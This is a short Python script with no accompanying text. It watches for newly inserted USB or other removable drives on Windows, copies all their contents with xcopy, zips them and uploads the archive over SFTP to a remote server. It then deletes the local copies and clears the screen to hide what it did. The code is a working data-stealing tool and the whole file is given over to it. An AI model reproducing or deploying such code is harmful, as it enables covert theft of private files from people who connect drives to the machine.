import os.path
import paramiko
import shutil
from base64 import decodebytes
keydata = b""" """ #key
key = paramiko.RSAKey(data=decodebytes(keydata))
ssh = paramiko.SSHClient()
ssh.get_host_keys().add('', 'ssh-rsa', key)
ssh.connect('ip', username='', password='',port=22)# sftp server information port=default ssh port
a="\*"
def device_inserted():
    pass
    try:
        os.system('mkdir copy_f')
    except:
        pass
    os.system(f'xcopy /s {x[0]+a} copy_f')
    os.system(f'cls')
    shutil.make_archive("zip_copy", 'zip', "copy_f")#creates a zip_copy.zip from copy_f file
    sftp = ssh.open_sftp()#connetcs to the server
    localpath = "zip_copy.zip"
    remotefilepath = "C:/Users/Administrator/Desktop/remote_file.zip"#server side file name  
    sftp.put(localpath,remotefilepath)#moves the local file
    sftp.close
    os.system("rmdir /s /Q copy_f")
    os.system("del zip_copy.zip")
def device_removed():
    pass
def diff(list1, list2):
    list_difference = [item for item in list1 if item not in list2]
    return list_difference
dl = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'# list of possible disk object names
drives = ['%s:' % d for d in dl if os.path.exists('%s:' % d)]
print(drives)
while True: # Checks for newly inserted usb drives
    uncheckeddrives = ['%s:' % d for d in dl if os.path.exists('%s:' % d)]
    x = diff(uncheckeddrives, drives)
    if x:
        pass
        device_inserted()
    x = diff(drives, uncheckeddrives)
    if x:
        pass
        device_removed()
    drives = ['%s:' % d for d in dl if os.path.exists('%s:' % d)]
